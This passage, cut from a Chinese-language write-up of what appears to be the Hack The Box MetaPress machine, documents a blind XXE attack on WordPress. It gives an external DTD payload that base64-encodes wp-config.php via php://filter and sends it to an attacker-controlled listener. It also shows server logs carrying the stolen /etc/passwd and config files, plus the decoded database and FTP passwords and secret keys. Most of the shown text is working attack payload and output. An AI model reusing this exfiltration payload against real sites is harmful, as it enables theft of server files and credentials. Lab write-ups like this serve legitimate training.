/?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory\n[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Closing\n```\n这里传回来了一段 base64，去解密看一下\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo'|base64 -d\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsshd:x:104:65534::/run/sshd:/usr/sbin/nologin\njnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash\nsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin\nsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false\nproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin\nftp:x:107:65534::/srv/ftp:/usr/sbin/nologin\nbase64: 无效的输入\n```\n确实成功弹回来了，那我们试试能不能获取到 wp-config.php\n\n```bash\n<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=../wp-config.php\" >\n<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.84:9000/?p=%file;'>\">\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# php -S 0.0.0.0:9000\n[Sat Dec 31 13:55:53 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Accepted\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 [200]: GET /evil.dtd\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44236 Closing\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Accepted\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory\n[Sat Dec 31 13:56:04 2022] 10.10.11.186:44252 Closing\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Accepted\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 [200]: GET /evil.dtd\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44268 Closing\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 Accepted\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directory\n[Sat Dec 31 13:56:05 2022] 10.10.11.186:44280 Closing\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# echo PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==|base64 -d\n<?php\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'blog' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'blog' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\ndefine( 'FS_METHOD', 'ftpext' );\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\ndefine( 'FTP_HOST', 'ftp.metapress.htb' );\ndefine( 'FTP_BASE', 'blog/' );\ndefine( 'FTP_SSL', false );\n\n/**#@+\n * Authentication Unique Keys and Salts.\n * @since 2.6.0\n */\ndefine( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );\ndefine( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );\ndefine( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );\ndefine( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );\ndefine( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );\ndefine( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );\ndefine( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );\ndefine( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );\n\n/**\n * WordPress Database Table prefix.\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n * @link https://wordpress.org/support/article/debugging-in-wordpress/\n */\ndefine( 'WP_DEBUG', false );\n\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) {\n        define( 'ABSPATH', __DIR__ . '/' );\n}\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\n```\n```bash\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\n```\n我们得到了 ftp 的登陆账号和密码\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ftp 10.10.11.186\nConnected to 